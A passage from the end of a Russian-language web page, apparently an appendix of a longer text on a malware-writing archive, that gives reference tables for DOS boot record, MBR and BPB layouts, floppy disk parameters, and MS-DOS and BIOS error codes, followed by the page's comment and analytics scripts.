<tr><td> 1Eh </td><td>480 </td><td>Программа начальной загрузки, называемая загрузочной записью (Boot Record).</td></tr>
<tr><td> 1FEh </td><td>02 </td><td>Код : 55 AA</td></tr>
</table>
<h3>Формат BOOT - записи для версии MS DOS 4.0</h3>
<table border="1" cellspacing="0" cellpadding="0" summary="Формат BOOT - записи для версии MS DOS 4.0">
<tr><th>Смещение (HEX)</th><th>Размер (DEC)</th><th>Содержимое</th></tr>
<tr><td> 00h </td><td>03 </td><td>Команда EB xx 90 перехода на программу начальной загрузки</td></tr>
<tr><td> 03h </td><td>08 </td><td>Название фирмы - производителя и номер операционной системы</td></tr>
<tr><td> 0Bh </td><td>25 </td><td>Расширенный блок параметров BIOS (EBPB)</td></tr>
<tr><td> 24h </td><td>01 </td><td>Физический номер дисковода ( 00h - для дискетного дисковода, 80h - для винчестера )</td></tr>
<tr><td> 25h </td><td>01 </td><td>Зарезервировано</td></tr>
<tr><td> 26h </td><td>01 </td><td>Символ " ) " - признак расширенной загрузочной записи MS DOS 4.0</td></tr>
<tr><td> 27h </td><td>04 </td><td>Серийный номер диска,создается во время его форматирования</td></tr>
<tr><td> 2Bh </td><td>11 </td><td>Метка ( Volume Label ) диска, задается во время его форматирования</td></tr>
<tr><td> 36h </td><td>08 </td><td>Обычно содержит запись типа "FAT 12" или аналогичную</td></tr>
<tr><td> 3Eh </td><td>448 </td><td>Программа начальной загрузки, называемая загрузочной записью (Boot Record).</td></tr>
<tr><td> 1FEh </td><td>02 </td><td>Код : 55 AA</td></tr>
</table>
<h3>Формат Master Boot Record ( MBR ) - главной загрузочной записи жесткого диска</h3>
<table border="1" cellspacing="0" cellpadding="0" summary="Формат Master Boot Record ( MBR ) - главной загрузочной записи жесткого диска">
<tr><th>Смещение (HEX)</th><th>Размер (DEC)</th><th>Содержимое</th></tr>
<tr><td> 00h </td><td>446 </td><td>Программа, называемая главной загрузочной записью (MBR, или Master Boot Record).</td></tr>
<tr><td> 1BEh </td><td>16 </td><td>Элемент таблицы разделов диска</td></tr>
<tr><td> 1CEh </td><td>16 </td><td>Элемент таблицы разделов диска</td></tr>
<tr><td> 1DEh </td><td>16 </td><td>Элемент таблицы разделов диска</td></tr>
<tr><td> 1EEh </td><td>16 </td><td>Элемент таблицы разделов диска</td></tr>
<tr><td> 1FEh </td><td>02 </td><td>Код : 55 AA</td></tr>
</table>
<h3>Формат BPB для версий MS DOS до 4.0</h3>
<table border="1" cellspacing="0" cellpadding="0" summary="Формат BPB для версий MS DOS до 4.0">
<tr><th>Смещение (HEX)</th><th>Размер (DEC)</th><th>Содержимое</th></tr>
<tr><td> 00h </td><td>02 </td><td>Количество байтов в одном секторе диска</td></tr>
<tr><td> 02h </td><td>01 </td><td>Количество секторов в одном кластере</td></tr>
<tr><td> 03h </td><td>02 </td><td>Количество зарезервированных секторов</td></tr>
<tr><td> 05h </td><td>01 </td><td>Количество копий FAT</td></tr>
<tr><td> 06h </td><td>02 </td><td>Максимальное количество дескрипторов файлов, содержащихся в корневом каталоге диска</td></tr>
<tr><td> 08h </td><td>02 </td><td>Общее количество секторов на носителе данных в разделе DOS</td></tr>
<tr><td> 0Ah </td><td>01 </td><td>Байт - описатель среды носителя данных</td></tr>
<tr><td> 0Bh </td><td>02 </td><td>Количество секторов, занимаемых одной копией FAT</td></tr>
</table>
<h3>Формат EBPB</h3>
<table border="1" cellspacing="0" cellpadding="0" summary="Формат EBPB">
<tr><th>Смещение (HEX)</th><th>Размер (DEC)</th><th>Содержимое</th></tr>
<tr><td> 00h </td><td>02 </td><td>Количество байтов в одном секторе диска</td></tr>
<tr><td> 02h </td><td>01 </td><td>Количество секторов в одном кластере</td></tr>
<tr><td> 03h </td><td>02 </td><td>Количество зарезервированных секторов</td></tr>
<tr><td> 05h </td><td>01 </td><td>Количество копий FAT</td></tr>
<tr><td> 06h </td><td>02 </td><td>Максимальное количество дескрипторов файлов, содержащихся в корневом каталоге диска</td></tr>
<tr><td> 08h </td><td>02 </td><td>Общее количество секторов на носителе данных в разделе DOS</td></tr>
<tr><td> 0Ah </td><td>01 </td><td>Байт - описатель среды носителя данных</td></tr>
<tr><td> 0Bh </td><td>02 </td><td>Количество секторов, занимаемых одной копией FAT</td></tr>
<tr><td> 0Dh </td><td>02 </td><td>Количество секторов на дорожке</td></tr>
<tr><td> 0Fh </td><td>02 </td><td>Количество головок накопителя</td></tr>
<tr><td> 11h </td><td>02 </td><td>Количество скрытых секторов для раздела, который по размеру меньше 32-х Мегабайт</td></tr>
<tr><td> 13h </td><td>02 </td><td>Количество скрытых секторов для раздела, который по размеру ревышает 32 Мегабайта (Используется только в MS DOS 4.0)</td></tr>
<tr><td> 15h </td><td>04 </td><td>Общее количество секторов на логическом диске для раздела, который по размеру превышает 32 Мегабайта</td></tr>
</table>
<h3>Параметры дискет различных типов</h3>
<p><em>(В таблицу не вошли данные о совсем старых дискетах с объемом 320 Kb, 180 Kb, 120 Kb и других):</em></p>
<table border="1" cellspacing="0" cellpadding="0" summary="Параметры дискет различных типов">
<tr><th> Диаметр диска </th><td>3.5" </td><td>3.5" </td><td>3.5" </td><td>5.25" </td><td>5.25"</td></tr>
<tr><th> Емкость диска, Kb </th><td>2880 </td><td>1440 </td><td>720 </td><td>1200 </td><td>360</td></tr>
<tr><th> Media Descryptor </th><td>F0h </td><td>F0h </td><td>F9h </td><td>F9h </td><td>FDh</td></tr>
<tr><th> Количество сторон </th><td>2 </td><td>2 </td><td>2 </td><td>2 </td><td>2</td></tr>
<tr><th> Количество дорожек на стороне </th><td>80 </td><td>80 </td><td>80 </td><td>80 </td><td>40</td></tr>
<tr><th> Количество секторов на дорожке </th><td>36 </td><td>18 </td><td>9 </td><td>15 </td><td>9</td></tr>
<tr><th> Размер сектора </th><td>512 </td><td>512 </td><td>512 </td><td>512 </td><td>512</td></tr>
<tr><th> Количество секторов в кластере </th><td>2 </td><td>1 </td><td>2 </td><td>1 </td><td>2</td></tr>
<tr><th> Длина FAT в секторах </th><td>9 </td><td>9 </td><td>3 </td><td>7 </td><td>2</td></tr>
<tr><th> Количество копий FAT </th><td>2 </td><td>2 </td><td>2 </td><td>2 </td><td>2</td></tr>
<tr><th> Длина корневого каталога в секторах </th><td>15 </td><td>14 </td><td>7 </td><td>14 </td><td>7</td></tr>
</table>
<h2><a name="pa3">Приложение 3. Коды ошибок при выполнении функция MS-DOS и BIOS</a></h2>
<table border="1" cellspacing="0" cellpadding="0" summary="Коды ошибок при выполнении функция MS-DOS и BIOS">
<tr><td> 00h </td><td> Ошибки нет</td></tr>
<tr><td> 01h </td><td> Неправильный номер функции</td></tr>
<tr><td> 02h </td><td> Файл не найден</td></tr>
<tr><td> 03h </td><td> Путь не найден</td></tr>
<tr><td> 04h </td><td> Слишком много открытых файлов</td></tr>
<tr><td> 05h </td><td> Доступ запрещен</td></tr>
<tr><td> 06h </td><td> Неправильный дескриптор</td></tr>
<tr><td> 07h </td><td> Уничтожен блок управления памятью (MCB-блок)</td></tr>
<tr><td> 08h </td><td> Не хватает памяти</td></tr>
<tr><td> 09h </td><td> Неправильный адрес блока памяти</td></tr>
<tr><td> 0Ah </td><td> Неправильное окружение</td></tr>
<tr><td> 0Bh </td><td> Неправильный формат</td></tr>
<tr><td> 0Ch </td><td> Неправильный код доступа</td></tr>
<tr><td> 0Dh </td><td> Неправильные данные</td></tr>
<tr><td> 0Eh </td><td> Неизвестное устройство</td></tr>
<tr><td> 0Fh </td><td> Неправильный дисковод</td></tr>
<tr><td> 10h </td><td> Попытка удалить текущий каталог</td></tr>
<tr><td> 11h </td><td> Не то же устройство</td></tr>
<tr><td> 12h </td><td> Больше нет файлов</td></tr>
<tr><td> 13h </td><td> Диск защищен от записи</td></tr>
<tr><td> 14h </td><td> Неизвестное устройство</td></tr>
<tr><td> 15h </td><td> Дисковод не готов</td></tr>
<tr><td> 16h </td><td> Неизвестная команда</td></tr>
<tr><td> 17h </td><td> Ошибка контрольной суммы</td></tr>
<tr><td> 19h </td><td> Ошибка поиска дорожки</td></tr>
<tr><td> 1Ah </td><td> Неизвестный носитель</td></tr>
<tr><td> 1Bh </td><td> Сектор не найден</td></tr>
<tr><td> 1Ch </td><td> В принтере нет бумаги</td></tr>
<tr><td> 1Dh </td><td> Отказ записи</td></tr>
<tr><td> 1Eh </td><td> Отказ чтения</td></tr>
<tr><td> 1Fh </td><td> Общая ошибка</td></tr>
<tr><td> 50h </td><td> Файл уже существует</td></tr>
<tr><td> 52h </td><td> Не могу создать каталог</td></tr>
<tr><td> 54h </td><td> Слишком много перенаправлений</td></tr>
<tr><td> 55h </td><td> Двойное перенаправление</td></tr>
<tr><td> 57h </td><td> Неправильный параметр</td></tr>
</table>
<h3>Коды ошибок при выполнении функций BIOS</h3>
<table border="1" cellspacing="0" cellpadding="0" summary="Коды ошибок при выполнении функций BIOS">
<tr><td> 00h </td><td> Ошибки нет</td></tr>
<tr><td> 01h </td><td> Неправильная команда</td></tr>
<tr><td> 02h </td><td> Не найдена адресная метка</td></tr>
<tr><td> 03h </td><td> Диск защищен от записи</td></tr>
<tr><td> 04h </td><td> Сектор не найден</td></tr>
<tr><td> 05h </td><td> Сброс жесткого диска не прошел</td></tr>
<tr><td> 06h </td><td> Дискета вынута</td></tr>
<tr><td> 07h </td><td> Неправильная таблица параметров жесткого диска (HDPT - Hard Disk Parameter Table)</td></tr>
<tr><td> 0Ch </td><td> Не найден тип носителя данных</td></tr>
<tr><td> 0Dh </td><td> Неправильное число секторов в формате на жестком диске</td></tr>
<tr><td> 10h </td><td> Невосстановимая ошибка данных</td></tr>
<tr><td> 11h </td><td> Восстановленная ошибка данных на жестком диске</td></tr>
<tr><td> 20h </td><td> Неисправность контроллера</td></tr>
<tr><td> 40h </td><td> Ошибка позиционирования</td></tr>
<tr><td> 80h </td><td> Тайм-аут диска</td></tr>
<tr><td> AAh </td><td> Жесткий диск не готов</td></tr>
<tr><td> BBh </td><td> Неизвестная ошибка жесткого диска</td></tr>
</table>
[<a style="" href="/lib/?lang=RU&amp;index=DO#vik00">Вернуться к списку</a>] [<a href="/lib/vik00.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vik00">de</a><a href="/lib/index.php?lang=en&amp;id=vik00">en</a><a href="/lib/index.php?lang=es&amp;id=vik00">es</a><a href="/lib/index.php?lang=it&amp;id=vik00">it</a><a href="/lib/index.php?lang=fr&amp;id=vik00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vik00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vik00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vik00">ua</a></div>
</body>
</html>
